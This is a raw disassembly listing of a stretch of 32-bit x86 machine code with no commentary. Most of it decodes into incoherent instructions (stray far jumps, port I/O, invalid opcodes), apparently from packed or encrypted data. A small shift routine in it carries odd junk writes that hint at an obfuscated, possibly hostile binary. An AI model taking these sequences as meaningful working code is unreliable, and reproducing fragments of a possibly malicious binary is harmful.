  408609:	xor    edi,DWORD PTR [edx-0x10355ea0]
  40860f:	pop    edx
  408610:	jmp    0x748f:0x69c29f52
  408617:	add    ebx,edi
  408619:	mov    ah,0xaf
  40861b:	sbb    esp,ebx
  40861d:	adc    eax,0xf4231330
  408622:	sbb    DWORD PTR [eax],edx
  408624:	sbb    DWORD PTR [ebx],ebx
  408626:	xchg   ebx,eax
  408627:	push   cs
  408628:	sub    eax,0xe70e8452
  40862d:	stc    
  40862e:	std    
  40862f:	ins    BYTE PTR es:[edi],dx
  408630:	and    bh,BYTE PTR gs:[eax+0x41695d6e]
  408637:	add    DWORD PTR [esi],ebx
  408639:	jae    0x408619
  40863b:	sbb    al,0x44
  40863d:	and    al,0xdd
  40863f:	mov    eax,ds:0x5c411ef7
  408644:	push   es
  408645:	push   esi
  408646:	fsubr  st(7),st
  408648:	cmc    
  408649:	xor    al,0xcb
  40864b:	push   eax
  40864c:	jmp    0x8812:0x240ee7e4
  408653:	call   FWORD PTR [edx+0x1d]
  408656:	push   bx
  408658:	stos   BYTE PTR es:[edi],al
  408659:	xchg   edx,eax
  40865a:	or     eax,0x73585c96
  40865f:	mov    esi,0xeaf16cc9
  408664:	imul   ebp,edi,0x5
  408667:	cmc    
  408668:	dec    eax
  408669:	out    0x73,al
  40866b:	bound  ecx,QWORD PTR [ebx+0x48afb570]
  408671:	enter  0x3992,0xc6
  408675:	test   eax,edx
  408677:	inc    esi
  408678:	xchg   esp,edi
  40867a:	stos   BYTE PTR es:[edi],al
  40867b:	mov    DWORD PTR [esi],edi
  40867d:	adc    eax,0xb6a45b9a
  408682:	mov    ch,0xc5
  408684:	call   0x5f86:0x4aecf727
  40868b:	mov    cl,0xaf
  40868d:	push   esp
  40868e:	sub    eax,DWORD PTR [eax-0x6a]
  408691:	das    
  408692:	mov    cs,WORD PTR [edi+0x66]
  408695:	retf   0x28ff
  408698:	jp     0x408666
  40869a:	fisub  DWORD PTR [ebp+0x3c]
  40869d:	inc    eax
  40869e:	mov    esi,0x331a11ee
  4086a3:	ret    
  4086a4:	xor    edx,0x8619c37d
  4086aa:	mov    dh,0x66
  4086ac:	adc    esi,DWORD PTR [eax-0x26]
  4086af:	mov    esi,0x97202a8a
  4086b4:	sub    esp,DWORD PTR [ecx]
  4086b6:	imul   ebx,DWORD PTR [edx-0x70],0xffffff90
  4086ba:	ret    0x32f0
  4086bd:	ret    
  4086be:	fs jmp 0x5d72:0xc1b64595
  4086c6:	sub    eax,0xa4bba870
  4086cb:	sub    eax,0xb3c46489
  4086d0:	inc    ecx
  4086d1:	stos   DWORD PTR es:[edi],eax
  4086d2:	mov    esp,0xcb81c71a
  4086d7:	fadd   DWORD PTR [eax+0x7cbde6be]
  4086dd:	cld    
  4086de:	mov    DWORD PTR [edx+0x34],ebp
  4086e1:	mov    ebp,0x9566068f
  4086e6:	pushf  
  4086e7:	mov    ecx,DWORD PTR ds:0xfaf4acd3
  4086ed:	data16 xor al,0xd0
  4086f0:	cld    
  4086f1:	push   edx
  4086f2:	mov    bl,0x8d
  4086f4:	js     0x40871b
  4086f6:	ins    DWORD PTR es:[edi],dx
  4086f7:	push   0xffffffc5
  4086f9:	add    DWORD PTR [ebp+0x3e6b6ba4],ebx
  4086ff:	jmp    0x2e3fb70a
  408704:	cld    
  408705:	add    eax,0x235e570e
  40870a:	mov    esi,0x58b4e9e
  40870f:	and    ah,BYTE PTR [edi+0x3a12684b]
  408715:	jl     0x4086cd
  408717:	(bad)  
  408718:	mov    cl,0x95
  40871a:	dec    ecx
  40871b:	or     DWORD PTR [ebp+edi*2+0x622c287a],esp
  408722:	out    0x8a,eax
  408724:	fimul  DWORD PTR [esi+0x41b9222a]
  40872a:	imul   edi,DWORD PTR [ecx-0x53160197],0x9cefd902
  408734:	add    eax,0xc68f4f5b
  408739:	mov    edx,0xc678905e
  40873e:	rcl    DWORD PTR [esp+ebx*4-0x3e],cl
  408742:	pop    ss
  408743:	sbb    edi,DWORD PTR [esi]
  408745:	ret    0x16e0
  408748:	dec    edi
  408749:	pop    ecx
  40874a:	and    esp,edx
  40874c:	pop    ss
  40874d:	push   ebx
  40874e:	dec    ebp
  40874f:	std    
  408750:	xchg   ecx,eax
  408751:	or     BYTE PTR [edi-0x28],bl
  408754:	pusha  
  408755:	xchg   esi,eax
  408756:	add    eax,0xa6b02f6d
  40875b:	xchg   esi,eax
  40875c:	lods   eax,DWORD PTR ds:[esi]
  40875d:	adc    dh,al
  40875f:	pop    ebx
  408760:	fdivr  DWORD PTR [esi]
  408762:	dec    edx
  408763:	outs   dx,BYTE PTR ds:[esi]
  408764:	cs out dx,al
  408766:	mov    dl,BYTE PTR [esi]
  408768:	stc    
  408769:	out    dx,al
  40876a:	out    0x8c,al
  40876c:	scas   al,BYTE PTR es:[edi]
  40876d:	cmp    BYTE PTR [esi],ch
  40876f:	js     0x4087dc
  408771:	xchg   ebx,eax
  408772:	popf   
  408773:	(bad)  
  408774:	out    0xf0,al
  408776:	outs   dx,DWORD PTR ds:[esi]
  408777:	ins    BYTE PTR es:[edi],dx
  408778:	retf   0x6f69
  40877b:	cmp    DWORD PTR [edi+eiz*1],edx
  40877e:	mov    ss,WORD PTR [edi+0x18]
  408781:	lahf   
  408782:	mov    ah,0xd1
  408784:	rcr    DWORD PTR [ecx+0x6043e81c],0x69
  40878b:	adc    bh,al
  40878d:	push   esp
  40878e:	mov    esi,0xa5166b1
  408793:	sti    
  408794:	push   ecx
  408795:	push   esi
  408796:	jg     0x408751
  408798:	pop    edx
  408799:	retf   0x3dc0
  40879c:	pop    esp
  40879d:	inc    esp
  40879e:	jno    0x408754
  4087a0:	popf   
  4087a1:	les    esp,FWORD PTR [ecx+0x2c7b3f7e]
  4087a7:	cmp    DWORD PTR [edi-0x2034145f],0x34
  4087ae:	or     DWORD PTR [ebx],ebp
  4087b0:	jg     0x408820
  4087b2:	scas   eax,DWORD PTR es:[edi]
  4087b3:	test   dl,0x39
  4087b6:	fstp   DWORD PTR [edi-0x1ea60484]
  4087bc:	inc    ebp
  4087bd:	lds    ebx,FWORD PTR [esi-0x62bc63a0]
  4087c3:	or     ebx,DWORD PTR [edx+ebp*8-0x80]
  4087c7:	and    DWORD PTR [ebp-0x24d88149],ebx
  4087cd:	clc    
  4087ce:	jb     0x408751
  4087d0:	leave  
  4087d1:	outs   dx,DWORD PTR es:[esi]
  4087d3:	pusha  
  4087d4:	or     DWORD PTR [edx],ecx
  4087d6:	sar    BYTE PTR [ecx+0x2322497d],0x81
  4087dd:	imul   eax
  4087df:	mov    ch,BYTE PTR [ebx]
  4087e1:	pushf  
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	ins    DWORD PTR es:[edi],dx
  408803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408804:	push   ss
  408805:	sar    DWORD PTR [esi-0x4241418d],1
  40880b:	les    edi,FWORD PTR [esi+0x2c5956be]
  408811:	frstpm(287 only) 
  408813:	ins    DWORD PTR es:[edi],dx
  408814:	or     esp,DWORD PTR ds:0x4c82cfd6
  40881a:	jmp    0x4087cc
  40881c:	mov    ah,0xb
  40881e:	mov    bh,0xb0
  408820:	rol    DWORD PTR [eax+0x28],1
  408823:	push   0x3
  408825:	loop   0x408858
  408827:	xchg   esi,eax
  408828:	mov    ds:0x76f42418,al
  40882d:	ja     0x408820
  40882f:	cmp    dl,BYTE PTR [eax+0x4e]
  408832:	aaa    
  408833:	mov    DWORD PTR [ebx],ecx
  408835:	into   
  408836:	aaa    
  408837:	jmp    0x408859
  408839:	inc    ecx
  40883a:	push   DWORD PTR [edi-0x2]
  40883d:	out    dx,eax
  40883e:	les    edx,FWORD PTR [ebx+0x349b5b3b]
  408844:	leave  
  408845:	retf   
  408846:	sbb    eax,0x111ce4b5
  40884b:	mov    cl,BYTE PTR [edx-0x5afecffc]
  408851:	sar    DWORD PTR [ecx],0x48
  408854:	mov    al,ds:0x553da94
  40885a:	out    dx,al
  40885b:	imul   eax,esp,0x47
  40885e:	add    WORD PTR [edx+eax*8],bp
  408862:	push   cs
  408863:	(bad)  
  408865:	xor    BYTE PTR [edx-0x17],ah
  408868:	fdivr  DWORD PTR [edi+0x3bb0dc6c]
  40886e:	imul   esi,edi,0xffffffef
  408871:	pop    esp
  408872:	scas   eax,DWORD PTR es:[edi]
  408873:	cld    
  408874:	imul   edx,DWORD PTR [ebp-0xfc4412f],0x51
  40887b:	xor    DWORD PTR [ebp-0x56037770],esp
  408881:	out    0xab,eax
  408883:	mov    esi,DWORD PTR [edi+ebp*1-0x52325ae3]
  40888a:	mov    WORD PTR [edi],es
  40888c:	xchg   esp,eax
  40888d:	ins    DWORD PTR es:[edi],dx
  40888e:	sbb    BYTE PTR ds:0xc8e51893,0xa4
  408895:	loopne 0x4088bc
  408897:	adc    DWORD PTR [eax+0x22],0xcd0672d0
  40889e:	ret    0x6c52
  4088a1:	push   esp
  4088a2:	ins    DWORD PTR es:[edi],dx
  4088a3:	ins    DWORD PTR es:[edi],dx
  4088a4:	mov    dh,0xc8
  4088a6:	push   cs
  4088a7:	jb     0x408888
  4088a9:	cli    
  4088aa:	pop    es
  4088ab:	pusha  
  4088ac:	jno    0x4088b3
  4088ae:	outs   dx,DWORD PTR ds:[esi]
  4088af:	fucomi st,st(3)
  4088b1:	inc    esi
  4088b2:	mov    dh,0x8
  4088b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b5:	xchg   edx,eax
  4088b6:	adc    ch,BYTE PTR [esi-0x4e]
  4088b9:	bound  edx,QWORD PTR ds:0xa231b43a
  4088bf:	push   es
  4088c0:	outs   dx,BYTE PTR fs:[esi]
  4088c2:	mov    eax,0x2ca78ad2
  4088c7:	lea    edx,[edi+0x212f4706]
  4088cd:	pop    ss
  4088ce:	sbb    esi,DWORD PTR [eax]
  4088d0:	lea    ebp,[eax+0x263986d0]
  4088d6:	shr    dh,cl
  4088d8:	retf   0xa5f8
  4088db:	pusha  
  4088dc:	rcl    DWORD PTR [ecx+0x1c],cl
  4088df:	clc    
  4088e0:	jp     0x408935
  4088e2:	lea    ebx,[esi-0x67]
  4088e5:	lahf   
  4088e6:	pop    eax
  4088e7:	dec    edi
  4088e8:	retf   0x1023
  4088eb:	ja     0x408937
  4088ed:	jg     0x4088d8
  4088ef:	in     al,dx
  4088f0:	ins    BYTE PTR es:[edi],dx
  4088f1:	cmp    dl,BYTE PTR [esi-0x2d819ce2]
  4088f7:	(bad)  
  4088f8:	int    0x36
  4088fa:	sub    eax,ebx
  4088fc:	dec    eax
  4088fd:	mov    BYTE PTR [edx+0x119a085e],dl
  408903:	adc    eax,0x378442e8
  408908:	ficomp DWORD PTR [edx]
  40890a:	push   cs
  40890b:	sbb    esi,esp
  40890d:	lds    edi,FWORD PTR ds:0xcf0f83b7
  408913:	int    0x6a
  408915:	mov    BYTE PTR [edx+0x6e],cl
  408918:	lods   eax,DWORD PTR ds:[esi]
  408919:	aas    
  40891a:	xchg   ebx,eax
  40891b:	pushf  
  40891c:	rol    DWORD PTR [esi-0x65],cl
  40891f:	aaa    
  408920:	outs   dx,BYTE PTR ds:[esi]
  408921:	dec    esi
  408922:	or     DWORD PTR [eax],edx
  408924:	int    0x80
  408926:	cmp    bl,BYTE PTR [edi]
  408928:	lock and eax,0x89aefb9a
  40892e:	inc    eax
  40892f:	adc    ch,dl
  408931:	and    ebp,DWORD PTR [esi+0x4dc9828]
  408937:	stos   BYTE PTR es:[edi],al
  408938:	add    al,0xe8
  40893a:	inc    eax
  40893b:	jns    0x4089b8
  40893d:	xor    ah,BYTE PTR [ecx+0x6d]
  408940:	or     DWORD PTR [eax-0x6f],edi
  408943:	mov    bh,BYTE PTR [esi-0x15]
  408946:	xchg   edi,eax
  408947:	sbb    eax,0xc4ef4f
  40894c:	iret   
  40894d:	push   ebp
  40894e:	mov    ecx,esi
  408950:	in     al,0x2f
  408952:	enter  0xb557,0xef
  408956:	in     eax,0xd6
  408958:	mov    bl,0x4b
  40895a:	push   ecx
  40895b:	mov    al,0x5d
  40895d:	lea    edi,[ecx]
  40895f:	inc    edx
  408960:	jecxz  0x4088f2
  408962:	sbb    eax,0xa8e521e7
  408967:	xor    bl,0xee
  40896a:	loope  0x4089ce
  40896c:	ins    DWORD PTR es:[edi],dx
  40896d:	out    0xd4,al
  40896f:	popa   
  408970:	retf   0xde8d
  408973:	test   eax,0x4f466aa4
  408978:	int    0x25
  40897a:	popf   
  40897b:	pop    edx
  40897c:	jbe    0x408976
  40897e:	es jne 0x408912
  408981:	out    0x2f,eax
  408983:	ins    DWORD PTR es:[edi],dx
  408984:	sub    DWORD PTR [ebx],edi
  408986:	sub    al,0xe9
  408988:	jnp    0x4089ee
  40898a:	addr16 ret 
  40898c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40898d:	mov    esp,0x1cb0e6a1
  408992:	inc    edi
  408993:	mov    ds:0x51d9c5d6,eax
  408998:	jge    0x4089a8
  40899a:	and    eax,esi
  40899c:	ret    0x4356
  40899f:	jge    0x408973
  4089a1:	xchg   esp,eax
  4089a2:	sbb    BYTE PTR [ebx+0x706556be],0x7f
  4089a9:	push   ss
  4089aa:	xchg   esp,eax
  4089ab:	pushf  
  4089ac:	pop    edx
  4089ad:	sub    BYTE PTR [edi],cl
  4089af:	lds    esi,FWORD PTR [edi]
  4089b1:	sbb    ch,BYTE PTR [ebp-0x5e]
  4089b4:	test   BYTE PTR [edx],bh
  4089b6:	lods   al,BYTE PTR ds:[esi]
  4089b7:	push   ds
  4089b8:	sbb    dh,bh
  4089ba:	in     eax,0xc5
  4089bc:	sbb    dh,BYTE PTR [ebx-0x36b65726]
  4089c2:	add    DWORD PTR [ebp-0x6a8c7511],ecx
  4089c8:	and    BYTE PTR [edx-0x79],al
  4089cb:	inc    bx
  4089cd:	adc    ebx,ecx
  4089cf:	call   0xd412cf17
  4089d4:	mov    eax,0x2ded35d5
  4089d9:	div    BYTE PTR [esi+0x787bd84]
  4089df:	test   ecx,esi
  4089e1:	sbb    DWORD PTR [edi+0x2ee689e6],ebp
  4089e7:	ins    BYTE PTR es:[edi],dx
  4089e8:	mov    DWORD PTR [ecx-0x7522cd8f],edx
  4089ee:	cdq    
  4089ef:	mov    ch,0xa5
  4089f1:	pop    es
  4089f2:	clc    
  4089f3:	sbb    edx,DWORD PTR [eax+eiz*4]
  4089f6:	inc    esi
  4089f7:	and    eax,0xbf13b5f0
  4089fc:	mov    ebx,0x56cbadef
  408a01:	fisttp DWORD PTR [esi+0x27737d2]
  408a07:	jo     0x4089a5
  408a09:	out    dx,al
  408a0a:	pop    edi
  408a0b:	mov    ecx,DWORD PTR [ebx+0xff7d080]
  408a11:	pushf  
  408a12:	inc    edx
  408a13:	scas   eax,DWORD PTR es:[edi]
  408a14:	inc    ebx
  408a15:	and    BYTE PTR [esi],bh
  408a17:	int    0x36
  408a19:	cmp    ebp,DWORD PTR [ebx+0x24]
  408a1c:	neg    BYTE PTR [edx]
  408a1e:	test   DWORD PTR [edi],edx
  408a20:	mov    edx,DWORD PTR [esi+0xb]
  408a23:	pop    ss
  408a24:	sahf   
  408a25:	pop    ebp
  408a26:	fidivr WORD PTR [eax]
  408a28:	adc    DWORD PTR [ebx+esi*2+0x1fc0df09],esi
  408a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a30:	jmp    0x408a83
  408a32:	xchg   edx,eax
  408a33:	pop    ebp
  408a34:	push   0x4b
  408a36:	jmp    0x408a2a
  408a38:	xlat   BYTE PTR ds:[ebx]
  408a39:	clc    
  408a3a:	js     0x4089bc
  408a3c:	(bad)  
  408a3d:	stos   BYTE PTR es:[edi],al
  408a3e:	aas    
  408a3f:	loop   0x408a22
  408a41:	div    cl
  408a43:	pushf  
  408a44:	jmp    0x3312e6d
  408a49:	rol    eax,0x35
  408a4c:	and    eax,0x79ff590e
  408a51:	sub    eax,0x426aa58f
  408a56:	out    0xa0,eax
  408a58:	in     eax,0xed
  408a5a:	and    ebp,DWORD PTR [ecx-0x69]
  408a5d:	in     eax,dx
  408a5e:	mov    esi,DWORD PTR [esi-0x5f]
  408a61:	jb     0x408aaa
  408a63:	cmp    al,0x4e
  408a65:	inc    edi
  408a66:	dec    ebp
  408a67:	iret   
  408a68:	mov    ecx,DWORD PTR [eax]
  408a6a:	sbb    eax,0x1a079686
  408a6f:	pop    ecx
  408a70:	int3   
  408a71:	int3   
  408a72:	in     al,0x1
  408a74:	jne    0x408a4a
  408a76:	xor    BYTE PTR [edx+0x75],ah
  408a79:	sti    
  408a7a:	mov    esp,DWORD PTR [edi+0x58]
  408a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a7e:	mov    ?,WORD PTR [eax]
  408a80:	sbb    edx,edx
  408a82:	dec    edi
  408a83:	or     DWORD PTR [eax],esp
  408a85:	pushf  
  408a86:	idiv   DWORD PTR [ecx-0x71015abb]
  408a8c:	xor    ebx,DWORD PTR [ebx+ebx*2-0xb52b8c7]
  408a93:	stc    
  408a94:	dec    edi
  408a95:	jp     0x408a5a
  408a97:	mov    esp,ds
  408a99:	scas   eax,DWORD PTR es:[edi]
  408a9a:	popa   
  408a9b:	jno    0x408aa7
  408a9d:	das    
  408a9e:	xchg   edi,eax
  408a9f:	dec    edi
  408aa0:	ins    BYTE PTR es:[edi],dx
  408aa1:	stc    
  408aa2:	clc    
  408aa3:	fdivr  QWORD PTR [ecx-0x849ac94]
  408aa9:	sbb    DWORD PTR [esi+0x69],ebx
  408aac:	inc    esp
  408aad:	mov    edi,0xa8c7b948
  408ab2:	aas    
  408ab3:	pop    ss
  408ab4:	arpl   WORD PTR [ebp-0x5673c72c],dx
  408aba:	clc    
  408abb:	repz cmp eax,0x79a1ea38
  408ac1:	mov    eax,0xb2c1cae3
  408ac6:	div    DWORD PTR [esi]
  408ac8:	sbb    al,0x20
  408aca:	in     al,0xde
  408acc:	lods   al,BYTE PTR ds:[esi]
  408acd:	xor    esi,DWORD PTR [ebx+esi*1-0x26dd7d4]
  408ad4:	push   ecx
  408ad5:	add    edi,DWORD PTR [edx]
  408ad7:	pop    es
  408ad8:	idiv   edi
  408ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408adb:	scas   eax,DWORD PTR es:[edi]
  408adc:	mov    dl,0x5a
  408ade:	ja     0x408afa
  408ae0:	stos   BYTE PTR es:[edi],al
  408ae1:	or     DWORD PTR ds:0x7da0da19,ebx
  408ae7:	mov    fs,WORD PTR [edi+eiz*4-0x3dd9ce29]
  408aee:	jb     0x408aa7
  408af0:	pop    edi
  408af1:	pop    ebx
  408af2:	ins    BYTE PTR es:[edi],dx
  408af3:	gs jge 0x408aaf
  408af6:	dec    edi
  408af7:	mov    eax,ds:0xf55b7cce
  408afc:	sub    ch,BYTE PTR [ebp-0x2c6b2fe2]
  408b02:	mov    bh,0x56
  408b04:	jg     0x408ae7
  408b06:	pop    ds
  408b07:	push   ds
  408b08:	js     0x408ab1
  408b0a:	mov    al,0x33
  408b0c:	pushf  
  408b0d:	retf   0x38be
  408b10:	fadd   st,st(0)
  408b12:	inc    edi
  408b13:	pop    DWORD PTR [esi*2-0x44164f7b]
  408b1a:	pop    edx
  408b1b:	js     0x408aa8
  408b1d:	pop    ebp
  408b1e:	xchg   esp,eax
  408b1f:	outs   dx,BYTE PTR ds:[esi]
  408b20:	sbb    DWORD PTR [edx+0x17],eax
  408b23:	leave  
  408b24:	and    BYTE PTR [ecx-0x2c],ch
  408b27:	mov    ds:0xf2d90da7,eax
  408b2c:	jbe    0x408b0d
  408b2e:	mov    bh,0xdd
  408b30:	or     al,0xe6
  408b32:	fistp  WORD PTR [edx-0x2f545367]
  408b38:	pop    ebp
  408b39:	xchg   ebp,eax
  408b3a:	test   al,0xf
  408b3c:	xchg   DWORD PTR [edx-0xc251d1a],ebx
  408b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b43:	test   eax,0x6c683e5f
  408b48:	dec    ebx
  408b49:	xchg   BYTE PTR [ebx-0x66],ah
  408b4c:	push   0xffffff98
  408b4e:	iret   
  408b4f:	rol    DWORD PTR [eax+0x21],cl
  408b52:	imul   edi,esi,0xab95d8e5
  408b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b59:	pop    ds
  408b5a:	(bad)  
  408b5b:	mov    ds:0x12761351,al
  408b60:	xor    ecx,DWORD PTR [esi]
  408b62:	mov    ebx,0x102b6fd6
  408b67:	(bad)  
  408b68:	imul   esp,DWORD PTR [eax],0xc209cdc3
  408b6e:	pop    ds
  408b6f:	lahf   
  408b70:	mov    edx,0x512cc72c
  408b75:	add    ch,al
  408b77:	gs adc bl,dh
  408b7a:	pusha  
  408b7b:	mov    BYTE PTR [esp+eax*4+0x12],ch
  408b7f:	mov    edi,0xfa4a82cb
  408b84:	pop    esp
  408b85:	or     edi,esi
  408b87:	shl    DWORD PTR [edx+eax*2-0x6535daf7],cl
  408b8e:	sub    eax,0x3bbf3ee6
  408b93:	ror    BYTE PTR [edi],1
  408b95:	test   DWORD PTR [ecx],ecx
  408b97:	add    BYTE PTR [eax],al
  408b99:	add    BYTE PTR [ecx],bh
  408b9b:	dec    ebp
  408b9c:	or     al,0xf
  408b9e:	test   BYTE PTR [eax],dl
  408ba0:	add    BYTE PTR [eax],al
  408ba2:	add    bh,bh
  408ba4:	jne    0x408bc6
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x42835d,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x428521,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428579,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	xor    eax,0xbd923617
  408c16:	jns    0x408bd6
  408c18:	mov    esi,0xbebec279
  408c1d:	ja     0x408c32
  408c1f:	stos   BYTE PTR es:[edi],al
  408c20:	fcomp  QWORD PTR [ecx-0xfbc2bcf]
  408c26:	xchg   ecx,eax
  408c27:	out    dx,al
  408c28:	jae    0x408bea
  408c2a:	mov    WORD PTR [ebx],es
  408c2c:	sub    esi,esp
  408c2e:	retf   0x6636
  408c31:	mov    ecx,0xbd809388
  408c36:	push   es
  408c37:	in     al,dx
  408c38:	clc    
  408c39:	jmp    0x81eddb30
  408c3e:	ret    0xea53
  408c41:	bound  eax,QWORD PTR [esi+0x50b3a132]
  408c47:	test   al,ch
  408c49:	inc    esp
  408c4a:	mov    ebp,DWORD PTR [edi]
  408c4c:	stos   DWORD PTR es:[edi],eax
  408c4d:	shl    DWORD PTR [ebx],0x33
  408c50:	push   ebp
  408c51:	out    0x15,eax
  408c53:	sbb    DWORD PTR [ebx],ebp
  408c55:	loope  0x408bff
  408c57:	xchg   edi,eax
  408c58:	cmp    ch,BYTE PTR [edi-0x5c4a726e]
  408c5e:	jmp    0x5cc4dd9
  408c63:	jno    0x408c87
  408c65:	mov    DWORD PTR [edx+0x40],esp
  408c68:	call   0x63ed:0x9fe0c075
  408c6f:	jle    0x408c40
  408c71:	fisttp DWORD PTR [ecx+0x6b]
  408c74:	ret    
  408c75:	sub    dh,bl
  408c77:	packssdw mm3,QWORD PTR [eax+0x5a9a24db]
  408c7e:	out    dx,al
  408c7f:	add    eax,0x1bb4e2f8
  408c84:	add    eax,0xe906a7af
  408c89:	push   ds
  408c8a:	or     ch,0x81
  408c8d:	pop    ds
  408c8e:	ja     0x408cf9
  408c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c91:	pop    ebx
  408c92:	arpl   WORD PTR [edx+0x7f20d9db],dx
  408c98:	push   ds
  408c99:	xchg   BYTE PTR [eax],ch
  408c9b:	gs pop eax
  408c9d:	jnp    0x408cd3
  408c9f:	mov    ds:0xc7bbc9d2,al
  408ca4:	push   0x2a833db
  408ca9:	sub    cl,dh
  408cab:	test   BYTE PTR [ebp-0x492936bf],dl
  408cb1:	sbb    DWORD PTR [esi-0x70e71e4],esi
  408cb7:	lea    edx,[ecx-0xf36520]
  408cbd:	jmp    0x408c76
  408cbf:	xor    ch,bh
  408cc1:	ja     0x408c92
  408cc3:	mov    edx,0x5730c93d
  408cc8:	mov    ebx,0xd6d0cc6b
  408ccd:	cli    
  408cce:	add    BYTE PTR [edx-0x5bbf03e3],bh
  408cd4:	scas   eax,DWORD PTR es:[edi]
  408cd5:	cli    
  408cd6:	mov    ebp,0xe060118e
  408cdb:	jmp    0xfaa:0xf823a34e
  408ce2:	scas   eax,DWORD PTR es:[edi]
  408ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce4:	js     0x408d17
  408ce6:	pop    edx
  408ce7:	mov    ebp,0xe777b1d5
  408cec:	pop    esi
  408ced:	inc    ecx
  408cee:	je     0x408ceb
  408cf0:	jge    0x408ccb
  408cf2:	in     al,dx
  408cf3:	ins    DWORD PTR es:[edi],dx
  408cf4:	(bad)  
  408cf5:	mov    bl,0xfa
  408cf7:	mov    bh,0x7c
  408cf9:	mov    eax,0x3ad34044
  408cfe:	sub    ebp,esi
  408d00:	out    dx,al
  408d01:	mov    edx,0x2978447f
  408d06:	addr16 add eax,0x7e45ea26
  408d0c:	je     0x408d16
  408d0e:	sub    DWORD PTR [edi+0x40],0x4b
  408d12:	pop    es
  408d13:	rol    cl,0xe5
  408d16:	pop    edi
  408d17:	adc    eax,DWORD PTR [edx+0x78d457a0]
  408d1d:	ins    BYTE PTR es:[edi],dx
  408d1e:	jmp    0xa080a0ad
  408d23:	lods   al,BYTE PTR ds:[esi]
  408d24:	fistp  DWORD PTR [edx-0x6221e748]
  408d2a:	cmp    DWORD PTR ds:0x6ab027b5,edx
  408d30:	pop    edx
  408d31:	jecxz  0x408d2f
  408d33:	adc    al,0x73
  408d35:	pop    DWORD PTR [ebx-0x5e]
  408d38:	add    DWORD PTR [eax+esi*1+0x25e69af],esp
  408d3f:	inc    edx
  408d40:	es mov bh,0x92
  408d43:	pop    edi
  408d44:	add    BYTE PTR [esi-0x7c],dl
  408d47:	pop    ds
  408d48:	push   ds
  408d49:	sub    dl,BYTE PTR [ebp+edx*4-0x4f0736b8]
  408d50:	cmc    
  408d51:	xor    DWORD PTR [ebp+0x58],edx
  408d54:	mov    DWORD PTR [esi-0x6c],edi
  408d57:	fstp   TBYTE PTR [esi]
  408d59:	sahf   
  408d5a:	pop    ebp
  408d5b:	jae    0x408d92
  408d5d:	jge    0x408dbe
  408d5f:	test   BYTE PTR [esi],bh
  408d61:	sbb    al,0x41
  408d63:	inc    ebp
  408d64:	jno    0x408d33
  408d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d67:	adc    eax,0x85c71cc9
  408d6c:	(bad)  
  408d6d:	jp     0x408d21
  408d6f:	xchg   ebx,eax
  408d70:	inc    esp
  408d71:	popa   
  408d72:	add    al,0x54
  408d74:	fist   WORD PTR [ecx-0x4b]
  408d77:	lods   al,BYTE PTR ds:[esi]
  408d78:	jp     0x408d03
  408d7a:	adc    BYTE PTR [edi],0xe1
  408d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d7e:	dec    ecx
  408d7f:	pop    esp
  408d80:	repnz mov bl,0xf5
  408d83:	pop    ebp
  408d84:	outs   dx,BYTE PTR ds:[esi]
  408d85:	mov    esp,0x4964bf8a
  408d8a:	iret   
  408d8b:	add    dh,BYTE PTR [eax]
  408d8d:	mov    ?,WORD PTR [eax-0x3efadd20]
  408d93:	mov    ebp,0xe491074a
  408d98:	dec    edx
  408d99:	popf   
  408d9a:	aam    0x1a
  408d9c:	test   BYTE PTR [edi+0x4f],bh
  408d9f:	les    ebx,FWORD PTR [edi-0x6eb9afc9]
  408da5:	les    edi,FWORD PTR ss:[eax]
  408da8:	repnz in eax,dx
  408daa:	jnp    0x408d81
  408dac:	sub    ch,BYTE PTR [edi+0x7c3fb5d1]
  408db2:	xchg   esp,eax
  408db3:	scas   al,BYTE PTR es:[edi]
  408db4:	mov    ds,WORD PTR [esi]
  408db6:	mov    BYTE PTR [edx+0x77b5e1dd],dl
  408dbc:	mov    bl,bl
  408dbe:	pop    ds
  408dbf:	fstp   QWORD PTR [ebx+0x9]
  408dc2:	(bad)  
  408dc3:	stos   DWORD PTR es:[edi],eax
  408dc4:	xor    BYTE PTR [ebx+0x6efd8dc2],0x30
